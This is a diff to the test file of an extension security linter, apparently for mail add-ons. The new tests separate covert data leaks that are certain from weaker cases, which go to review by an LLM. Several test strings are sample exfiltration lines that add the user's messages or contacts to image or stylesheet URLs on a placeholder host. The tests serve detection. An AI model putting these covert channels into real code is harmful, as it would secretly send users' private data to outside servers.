@@ -27,6 +27,7 @@ import coreSymbolInWebext from "../../src/checks/rules/core-symbol-in-webext.js"
 import missingEnglish from "../../src/checks/rules/missing-english-localization.js";
 import disguisedResource from "../../src/checks/rules/disguised-resource.js";
 import disguisedStylesheet from "../../src/checks/rules/disguised-stylesheet.js";
+import disguisedTransmission from "../../src/checks/rules/disguised-transmission.js";
 import unparsableFile from "../../src/checks/rules/unparsable-file.js";
 import dataExfiltration from "../../src/checks/rules/data-exfiltration.js";
 import cleartextTransmission from "../../src/checks/rules/cleartext-transmission.js";
@@ -1683,17 +1684,44 @@ test("severity:auto fails safe to error when the check sets none/invalid", async
 // Covert channels (data appended to an image/CSS/resource URL) are a flat
 // error; a normal fetch to a remote host escalates for an options-page consent
 // check. Local destinations and data-free covert loads are ignored.
-test("disguised checks flag covert URLs built with appended data", () => {
+test("disguised-* hard-flag the STRONG covert case (a user-data API in the URL)", () => {
   const res = (code) => disguisedResource.run(jsCtx(code)).length;
   const sty = (code) => disguisedStylesheet.run(jsCtx(code)).length;
-  assert.equal(res('img.src = "https://x/?d=" + body;'), 1); // resource sink
+  // A user-data API call inside the covert URL -> provably user data -> hard error.
   assert.equal(
-    sty('el.style.backgroundImage = "url(https://x/?d=" + v + ")";'),
+    res('img.src = "https://x/?d=" + messenger.messages.list();'),
     1
-  ); // stylesheet sink
+  );
+  assert.equal(
+    sty(
+      'el.style.backgroundImage = "url(https://x/?d=" + messenger.contacts.list() + ")";'
+    ),
+    1
+  );
+  // A merely-appended runtime value (no user-data API) is the WEAK case - NOT a
+  // hard finding here (it goes to disguised-transmission, asserted below).
+  assert.equal(res('img.src = "https://x/?d=" + body;'), 0);
   assert.equal(res('img.src = "./logo.png";'), 0); // local
   assert.equal(res('img.src = "https://x/logo.png";'), 0); // static, no data
-  assert.equal(res('fetch("https://x/?d=" + body);'), 0); // overt, not covert
+});
+
+test("disguised-transmission takes the WEAK covert case as an LLM candidate", () => {
+  const cands = (code) => {
+    const out = disguisedTransmission.run(jsCtx(code));
+    return out.llm ? out.llm.candidates.length : 0;
+  };
+  assert.equal(cands('img.src = "https://x/?d=" + body;'), 1); // appended-only
+  assert.equal(
+    cands('window.location.href = "https://x/" + team + "/inbox";'),
+    1
+  ); // navigation, appended-only (the birdbox shape)
+  // The strong case stays with the hard disguised-* checks, not here.
+  assert.equal(
+    cands('img.src = "https://x/?d=" + messenger.messages.list();'),
+    0
+  );
+  assert.equal(cands('img.src = "https://x/logo.png";'), 0); // static, no data
+  assert.equal(cands('fetch("https://x/?d=" + body);'), 0); // overt, not covert
 });
 
 test("data-exfiltration makes a candidate per overt remote transmission only", () => {
